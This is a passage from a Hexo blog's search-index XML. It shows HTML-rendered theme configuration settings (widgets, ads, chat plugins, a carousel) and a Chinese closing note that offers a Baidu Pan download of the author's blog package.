为空则使用默认标签页</span><br><span class="line"></span><br><span class="line"># 分类页样式</span><br><span class="line"># type: | love | bubble |</span><br><span class="line">category_style:</span><br><span class="line">  type: love # 为空则使用默认标签页</span><br><span class="line"></span><br><span class="line"># 侧栏自定义时间</span><br><span class="line">diy_time:</span><br><span class="line">  runtime:</span><br><span class="line">    enable: true#运行时间</span><br><span class="line">    birthday: &quot;07&#x2F;02&#x2F;2020 10:00:00&quot;</span><br><span class="line">  clock:</span><br><span class="line">    enable: true # 粒子时钟</span><br><span class="line"></span><br><span class="line"># 看板娘</span><br><span class="line">live2d:</span><br><span class="line">  enable: true</span><br><span class="line"></span><br><span class="line"># aplayer音乐播放器</span><br><span class="line">aplayer:</span><br><span class="line">  enable: false</span><br><span class="line"></span><br><span class="line"># https:&#x2F;&#x2F;player.lmih.cn&#x2F;</span><br><span class="line">haoyuePlayer:</span><br><span class="line">  enable: true</span><br><span class="line">  key: 159368326389</span><br><span class="line"></span><br><span class="line"># 网站右下角旋转魔方</span><br><span class="line">cube:</span><br><span class="line">  enable: true</span><br><span class="line">  type: mini # mini | hollow</span><br><span class="line"></span><br><span class="line"># Console 输出第三方个性化字体</span><br><span class="line">fig_font:</span><br><span class="line">  enable: true</span><br><span class="line">  font: Big Money-ne</span><br><span class="line">  input_text: Welcome To Leaface</span><br><span class="line"></span><br><span class="line"># Console 输出自定义字体</span><br><span class="line">diy_font:</span><br><span class="line">  enable: true</span><br><span class="line">  input_text: Welcome To Leaface</span><br><span class="line"></span><br><span class="line"># 谷歌广告</span><br><span class="line">google_ads:</span><br><span class="line">  enable: false</span><br><span class="line">  auto_ads: true # next&#x2F;layout&#x2F;_layout.swig、 _partials&#x2F;head.swig、文章内部</span><br><span class="line">  comments_ads: true # next&#x2F;layout&#x2F;_partials&#x2F;comments.swig</span><br><span class="line">  sidebar_ads: false # next&#x2F;layout&#x2F;_macro&#x2F;sidebar.swig</span><br><span class="line">  post_ads: false # next&#x2F;layout&#x2F;_macro&#x2F;post.swig</span><br><span class="line"></span><br><span class="line"># Online contact</span><br><span class="line">daovoice: false</span><br><span class="line">daovoice_app_id: XXXXXXXX</span><br><span class="line"></span><br><span class="line"># Tidio online chat</span><br><span class="line"># see: https:&#x2F;&#x2F;www.tidiochat.com</span><br><span class="line">tidio:</span><br><span class="line">  enable: true</span><br><span class="line">  key: XXXXXXXX # Public_Key</span><br><span class="line"></span><br><span class="line">pdf:</span><br><span class="line">  enable: true</span><br><span class="line">  # Default height</span><br><span class="line">  height: 500px</span><br><span class="line"></span><br><span class="line"># Hotjar页面反馈</span><br><span class="line"># see: https:&#x2F;&#x2F;www.hotjar.com&#x2F;</span><br><span class="line">hotjar:</span><br><span class="line">  enable: false</span><br><span class="line">  siteID: XXXXXXXX # site ID</span><br><span class="line"></span><br><span class="line"># 近期文章</span><br><span class="line">recent_posts_title: 近期文章</span><br><span class="line">recent_posts_layout: block</span><br><span class="line">recent_posts: true</span><br><span class="line"></span><br><span class="line">#  https:&#x2F;&#x2F;github.com&#x2F;overtrue&#x2F;share.js</span><br><span class="line">share_js: true</span><br><span class="line"></span><br><span class="line"># 网站底部订阅按钮</span><br><span class="line">web_subscribe:</span><br><span class="line">  enable: true</span><br><span class="line"></span><br><span class="line"># Dependencies: https:&#x2F;&#x2F;github.com&#x2F;tea3&#x2F;hexo-related-popular-posts</span><br><span class="line">related_posts:</span><br><span class="line">  enable: true</span><br><span class="line">  title: 相关文章</span><br><span class="line">  icon: graduation-cap</span><br><span class="line">  display_in_home: false</span><br><span class="line">  params:</span><br><span class="line">    maxCount: 10</span><br><span class="line">    #PPMixingRate: 0.0</span><br><span class="line">    #isDate: false</span><br><span class="line">    #isImage: false</span><br><span class="line">    #isExcerpt: false</span><br><span class="line"></span><br><span class="line"># 主页轮播图 使用 620x310 的图片</span><br><span class="line">#Home carousel map, from means link, img means picture</span><br><span class="line">carousel:</span><br><span class="line">  enable: True</span><br><span class="line">  item: [    &#123;</span><br><span class="line">      &#39;link&#39;: &#39;https:&#x2F;&#x2F;gylq.gitee.io&#x2F;2020&#x2F;07&#x2F;16&#x2F;2020-7-16&#x2F;&#39;,</span><br><span class="line">      &#39;img&#39;: &#39;https:&#x2F;&#x2F;s1.ax1x.com&#x2F;2020&#x2F;07&#x2F;16&#x2F;UB8doR.png&#39;</span><br><span class="line">    &#125;,</span><br><span class="line">  ]</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p><strong>图片有些眼花缭乱，一顿操作猛如虎，实际操作几分钟，授人以鱼不如授人以渔，但是我还是把鱼给你们吧。</strong></p>
<blockquote>
<p><strong><em>下面是我的博客的打包，可以让大家少安装一些依赖程序，少走度娘坑，有需要的自取，希望能帮助到大家。“使用方式”：就是直接覆盖你的博客文件夹就行了。</em></strong></p>
<p><a href="https://pan.baidu.com/s/1aMl-IeI5tJ_aw1F8YO2kNQ" target="_blank" rel="noopener">百度云盘</a></p>
<p>提取码：gylq</p>
</blockquote>
</blockquote>
]]></content>
      <categories>
        <category>hexo博客搭建</category>
      </categories>
      <tags>
        <tag>博客搭建</tag>
      </tags>
  </entry>
</search>
